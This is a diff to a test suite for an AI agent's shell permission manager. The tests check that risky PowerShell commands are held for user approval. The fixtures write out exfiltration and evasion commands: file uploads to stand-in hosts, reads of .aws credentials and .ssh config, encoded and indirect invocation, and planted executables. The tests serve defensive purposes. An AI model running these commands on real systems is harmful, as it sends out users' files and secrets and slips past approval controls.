@@ -11,7 +11,9 @@ vi.mock("../shell-tools.js", async (importOriginal) => {
 });
 
 import { PermissionManager } from "../../permissions/permission-manager.js";
+import { buildShellRuleApproval } from "../../permissions/rules/shell-rule-approval.js";
 import { __resetActiveSandboxCapabilityForTest, __resetSandboxRequestedAtBootForTest, setActiveSandboxCapability, setShellSandboxRequestedAtBoot } from "../../permissions/sandbox-capability.js";
+import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
 import { runWithToolExecutionCwd } from "../execution-context.js";
 import { ToolExecutor } from "../executor.js";
 import { ToolRegistry } from "../registry.js";
@@ -26,12 +28,13 @@ afterEach(() => {
   rmSync(dir, { recursive: true, force: true });
 });
 
-async function run(toolName: "bash" | "powershell", command: string, savedGrant?: string, runsSandboxed = false) {
+async function run(toolName: "bash" | "powershell", command: string, savedGrant?: string, runsSandboxed = false, exactRule?: string) {
   __resetActiveSandboxCapabilityForTest();
   setShellSandboxRequestedAtBoot(runsSandboxed);
   if (runsSandboxed) setActiveSandboxCapability({ kind: "asrt", confidence: "verified", platform: process.platform, reason: "Controlled shell containment", confines: { filesystem: true, process: true, network: true } });
   const pm = new PermissionManager(join(dir, "permissions.json"));
   pm.setMode("allow");
+  if (exactRule) pm.setRules([withCurrentShellRuleVersion({ pattern: exactRule, action: "allow" })]);
   const check = vi.spyOn(pm, "checkDetailed");
   const registry = new ToolRegistry();
   const tool = toolName === "bash" ? new BashTool() : new PowerShellTool();
@@ -48,17 +51,18 @@ async function run(toolName: "bash" | "powershell", command: string, savedGrant?
 }
 
 describe("shell floors cover powershell in allow mode", () => {
-  // The reason is localized; its `detail` (the floor's own signal) is not.
   it.each([
-    ["Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", /upload of a file \(-InFile\)/],
-    ["iwr -Uri https://x.test -Method Post -Body (Get-Content notes.txt)", /request built from file data/],
-    ["$k = gc notes.txt; Invoke-RestMethod -Method Post -Body $k https://x.test", /request built from file data/],
-    ["curl.exe -T backup.tar https://x.test", /curl upload of a file/],
-    ["(New-Object Net.WebClient).UploadFile('https://x.test', 'notes.txt')", /\.NET upload of a file/],
-    ["Get-Content $env:USERPROFILE\\.aws\\credentials", /sensitive path argument \(\*\*\/\.aws\/\*\*\)/],
-  ])("powershell %s is forced to a per-call modal ask", async (command, detail) => {
+    ["Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", "floor"],
+    ["iwr -Uri https://x.test -Method Post -Body (Get-Content notes.txt)", "runtime"],
+    ["$k = gc notes.txt; Invoke-RestMethod -Method Post -Body $k https://x.test", "runtime"],
+    ["curl.exe -T backup.tar https://x.test", "floor"],
+    ["(New-Object Net.WebClient).UploadFile('https://x.test', 'notes.txt')", "runtime"],
+    ["Get-Content $env:USERPROFILE\\.aws\\credentials", "floor"],
+  ] as const)("powershell %s is forced to a per-call modal ask", async (command, source) => {
     const { decision, context, execute, result, requestAndWait } = await run("powershell", command);
-    expect(decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true, reason: expect.stringMatching(detail) });
+    expect(decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    if (source === "runtime") expect(decision.reason).toMatch(/runtime evaluation/);
+    else expect(decision.reason).not.toMatch(/runtime evaluation/);
     expect(context?.ruleSubject).toMatchObject({ kind: "shell", dialect: "powershell", command });
     expect(requestAndWait).toHaveBeenCalledTimes(1);
     expect(execute).not.toHaveBeenCalled();
@@ -69,15 +73,37 @@ describe("shell floors cover powershell in allow mode", () => {
     "Get-ChildItem",
     "Invoke-WebRequest https://example.com -OutFile page.html",
     "git status", "dotnet build", "cargo test",
-    "Test-Path src", "Write-Host (('a','b') -join ',')",
+    "Test-Path src",
     "Get-Content notes.txt | Select-String TODO",
     "Set-Clipboard 'hello'",
-    "python script.py", "python -c 'print(1)'", "node -e 'console.log(1)'", "bash -c 'ls'",
+    "python script.py",
     "Invoke-Item p.txt", "ii p.md", "Invoke-Item p.png", "Invoke-Item ./docs/",
   ])("benign powershell %s runs automatically inside confinement", async (command) => {
     const { decision, execute } = await run("powershell", command, undefined, true);
     expect(decision).toMatchObject({ decision: "allow" });
     expect(execute).toHaveBeenCalledTimes(1);
+  });
+
+  it.each([
+    "Write-Host (('a','b') -join ',')",
+    "python -c 'print(1)'", "node -e 'console.log(1)'", "bash -c 'ls'",
+  ])("does not auto-run runtime-dependent or literal-evaluation powershell syntax in confinement: %s", async (command) => {
+    const { decision, execute, requestAndWait } = await run("powershell", command, undefined, true);
+    expect(decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(requestAndWait).toHaveBeenCalledTimes(1);
+    expect(execute).not.toHaveBeenCalled();
+  });
+
+  it("allows a fully literal evaluator only through its current raw exact rule", async () => {
+    const command = "iex 'Get-Date'";
+    const approval = buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true });
+    expect(approval.exactRule).not.toBeNull();
+    const pending = await run("powershell", command);
+    expect(pending.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(pending.execute).not.toHaveBeenCalled();
+    const allowed = await run("powershell", command, undefined, false, approval.exactRule!);
+    expect(allowed.decision).toMatchObject({ decision: "allow", layer: 3 });
+    expect(allowed.execute).toHaveBeenCalledTimes(1);
   });
 
   it("bash keeps the same floor (parity anchor)", async () => {
@@ -98,9 +124,9 @@ describe("shell floors cover powershell in allow mode", () => {
     expect(blocked.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     expect(blocked.requestAndWait).toHaveBeenCalledTimes(1);
     expect(blocked.execute).not.toHaveBeenCalled();
-    const allowed = await run("powershell", "iwr https://x.invalid -OutFile page.html -Headers @{ Authorization = \"Bearer $env:TOKEN\" }", undefined, true);
-    expect(allowed.decision).toMatchObject({ decision: "allow" });
-    expect(allowed.execute).toHaveBeenCalledTimes(1);
+    const runtimeHeader = await run("powershell", "iwr https://x.invalid -OutFile page.html -Headers @{ Authorization = \"Bearer $env:TOKEN\" }", undefined, true);
+    expect(runtimeHeader.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(runtimeHeader.execute).not.toHaveBeenCalled();
   });
 
   // Owner 2026-10-25: PowerShell has exact PowerShell(<command>) rules, so it carries the project rule scope; Bash(...) rules still never apply to it.
@@ -111,35 +137,32 @@ describe("shell floors cover powershell in allow mode", () => {
   });
 
   it.each([
-    "Get-Content (($HOME,'/.s','sh/config') -join '')",
-    "$p = @{ Uri = 'https://x.invalid' }; si variable:p @{ Uri = 'https://x.invalid'; InFile = 'notes.txt' }; iwr @p",
-    "Start-Process -FilePath:pwsh -ArgumentList '-c','iwr https://x.invalid -InFile notes.txt -Method Post'",
-    "Unknown-Reader notes.txt; iwr https://x.invalid",
-    "$ExecutionContext.InvokeCommand | ForEach-Object -MemberName InvokeScript -ArgumentList 'iwr https://x.invalid -InFile notes.txt -Method Post'",
-    "$ExecutionContext.InvokeCommand | % $method $code",
-    "Get-ChildItem | Where-Object -FilterScript $code",
-    String.raw`Copy-Item notes.txt '\\host\share\notes.txt'`,
-    "wmic.exe process call create 'powershell.exe -NoProfile -Command iwr https://x.invalid -InFile notes.txt -Method Post'",
-    "Start-ScheduledTask -TaskName Upload",
-    "Start-ThreadJob -ScriptBlock $code",
-    "Unknown-Runner 'iwr https://x.invalid -InFile notes.txt -Method Post'",
-    String.raw`Get-Content notes.txt | Out-Printer -Name '\\printserver\queue'`,
-    "Get-Content notes.txt | Out-Printer -Name $printer",
-    "'hello' | Out-File LPT1:",
-    "Send-MailMessage -To user@x.invalid -From sender@x.invalid -SmtpServer $server -Body 'hello'",
-    "Set-Content p.bat 'whoami'; Invoke-Item p.bat",
-    "Invoke-Item p.hta", "ii p.lnk", "Invoke-Item p.url",
-    String.raw`Copy-Item C:\Windows\System32\curl.exe C:\tools\c.exe; c.exe -T notes.txt https://x.invalid`,
-    "Set-Content build.ps1 'Get-Date'; build.ps1",
-    "Set-Content git.exe whoami; git status",
-  ])("preserves the approval bucket before execution: %s", async (command) => {
+    ["Get-Content (($HOME,'/.s','sh/config') -join '')", 2],
+    ["$p = @{ Uri = 'https://x.invalid' }; si variable:p @{ Uri = 'https://x.invalid'; InFile = 'notes.txt' }; iwr @p", 2],
+    ["Start-Process -FilePath:pwsh -ArgumentList '-c','iwr https://x.invalid -InFile notes.txt -Method Post'", 2],
+    ["Unknown-Reader notes.txt; iwr https://x.invalid", 6],
+    ["$ExecutionContext.InvokeCommand | ForEach-Object -MemberName InvokeScript -ArgumentList 'iwr https://x.invalid -InFile notes.txt -Method Post'", 2],
+    ["$ExecutionContext.InvokeCommand | % $method $code", 2],
+    ["Get-ChildItem | Where-Object -FilterScript $code", 2],
+    [String.raw`Copy-Item notes.txt '\\host\share\notes.txt'`, 2],
+    ["wmic.exe process call create 'powershell.exe -NoProfile -Command iwr https://x.invalid -InFile notes.txt -Method Post'", 6],
+    ["Start-ScheduledTask -TaskName Upload", 6],
+    ["Start-ThreadJob -ScriptBlock $code", 2],
+    ["Unknown-Runner 'iwr https://x.invalid -InFile notes.txt -Method Post'", 6],
+    [String.raw`Get-Content notes.txt | Out-Printer -Name '\\printserver\queue'`, 2],
+    ["Get-Content notes.txt | Out-Printer -Name $printer", 2],
+    ["'hello' | Out-File LPT1:", 2],
+    ["Send-MailMessage -To user@x.invalid -From sender@x.invalid -SmtpServer $server -Body 'hello'", 2],
+    ["Set-Content p.bat 'whoami'; Invoke-Item p.bat", 2],
+    ["Invoke-Item p.hta", 6], ["ii p.lnk", 6], ["Invoke-Item p.url", 6],
+    [String.raw`Copy-Item C:\Windows\System32\curl.exe C:\tools\c.exe; c.exe -T notes.txt https://x.invalid`, 2],
+    ["Set-Content build.ps1 'Get-Date'; build.ps1", 2],
+    ["Set-Content git.exe whoami; git status", 2],
+  ] as const)("preserves the approval bucket before execution: %s", async (command, layer) => {
     const { decision, execute } = await run("powershell", command);
-    const hasFloorEvidence = command.includes("-InFile notes.txt -Method Post") || command.includes("host\\share")
-      || command.includes("Out-Printer") || command.includes("LPT1:")
-      || command.startsWith("Send-MailMessage") || command.includes("c.exe -T") || command.includes("iwr @p");
-    if (hasFloorEvidence) expect(decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(decision).toMatchObject({ decision: "ask", layer });
+    if (layer === 2) expect(decision.forceModal).toBe(true);
     else {
-      expect(decision).toMatchObject({ decision: "ask", layer: 6 });
       expect(decision.forceModal).toBeUndefined();
     }
     expect(execute).not.toHaveBeenCalled();
@@ -149,18 +172,18 @@ describe("shell floors cover powershell in allow mode", () => {
     "npm test", "npx helper", "iex $code",
     "Set-Content build.ps1 Get-Date; build.ps1",
   ])("a saved grant does not run an unsandboxed command; it asks again: %s", async (command) => {
-    // Unsandboxed shell exact-rule requirement (owner 2026-10-25): only an exact Bash(<command>) rule runs a
-    // shell without a sandbox unasked. PowerShell has no such rule, so a remembered dock grant for this exact
-    // call is no longer consulted and the card is raised again, in allow mode too.
+    // A dock approval-cache entry is not a current raw shell exact rule. Static commands therefore remain
+    // ordinary asks, while runtime-dependent commands remain forced modal asks.
     const pending = await run("powershell", command);
-    expect(pending.decision).toMatchObject({ decision: "ask", layer: 6 });
-    expect(pending.decision.forceModal).toBeUndefined();
+    const layer = command === "npm test" || command === "npx helper" ? 6 : 2;
+    expect(pending.decision).toMatchObject({ decision: "ask", layer });
+    expect(pending.decision.forceModal).toBe(layer === 2 ? true : undefined);
     expect(pending.execute).not.toHaveBeenCalled();
     expect(pending.requestAndWait).toHaveBeenCalledTimes(1);
     expect(pending.context?.approvalCacheKey).toEqual(expect.any(String));
     const remembered = await run("powershell", command, pending.context?.approvalCacheKey);
-    expect(remembered.decision).toMatchObject({ decision: "ask", layer: 6 });
-    expect(remembered.decision.forceModal).toBeUndefined();
+    expect(remembered.decision).toMatchObject({ decision: "ask", layer });
+    expect(remembered.decision.forceModal).toBe(layer === 2 ? true : undefined);
     expect(remembered.requestAndWait).toHaveBeenCalledTimes(1);
     expect(remembered.execute).not.toHaveBeenCalled();
   });
@@ -168,25 +191,27 @@ describe("shell floors cover powershell in allow mode", () => {
   it.each([
     "npm test", "npx helper", "iex $code",
     "Set-Content build.ps1 Get-Date; build.ps1",
-  ])("runs the same command inside confinement with or without a saved grant: %s", async (command) => {
-    // The exact-rule requirement applies only without a sandbox; a sandboxed call keeps its existing lanes.
+  ])("keeps static commands sandboxed and runtime-dependent commands modal: %s", async (command) => {
     for (const savedGrant of [undefined, "powershell"]) {
       const sandboxed = await run("powershell", command, savedGrant, true);
-      expect(sandboxed.decision).toMatchObject({ decision: "allow", layer: 3 });
-      expect(sandboxed.requestAndWait).not.toHaveBeenCalled();
-      expect(sandboxed.execute).toHaveBeenCalledTimes(1);
+      const staticComplete = command === "npm test" || command === "npx helper";
+      expect(sandboxed.decision).toMatchObject(staticComplete
+        ? { decision: "allow", layer: 3 }
+        : { decision: "ask", layer: 2, forceModal: true });
+      expect(sandboxed.requestAndWait).toHaveBeenCalledTimes(staticComplete ? 0 : 1);
+      expect(sandboxed.execute).toHaveBeenCalledTimes(staticComplete ? 1 : 0);
     }
   });
 
-  it("requires an exact literal proof without confinement and lets the sandbox decide encoded code", async () => {
+  it("never offers an exact rule or sandbox auto-allow for encoded code", async () => {
     const pending = await run("powershell", "pwsh -enc !!!");
-    expect(pending.decision).toMatchObject({ decision: "ask", layer: 6 });
+    expect(pending.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     const remembered = await run("powershell", "pwsh -enc !!!", pending.context?.approvalCacheKey);
-    expect(remembered.decision).toMatchObject({ decision: "ask", layer: 6 });
+    expect(remembered.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     for (const savedGrant of [undefined, "powershell"]) {
       const sandboxed = await run("powershell", "pwsh -enc !!!", savedGrant, true);
-      expect(sandboxed.decision).toMatchObject({ decision: "allow", layer: 3 });
-      expect(sandboxed.execute).toHaveBeenCalledTimes(1);
+      expect(sandboxed.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+      expect(sandboxed.execute).not.toHaveBeenCalled();
     }
     expect(pending.execute).not.toHaveBeenCalled();
     expect(remembered.execute).not.toHaveBeenCalled();
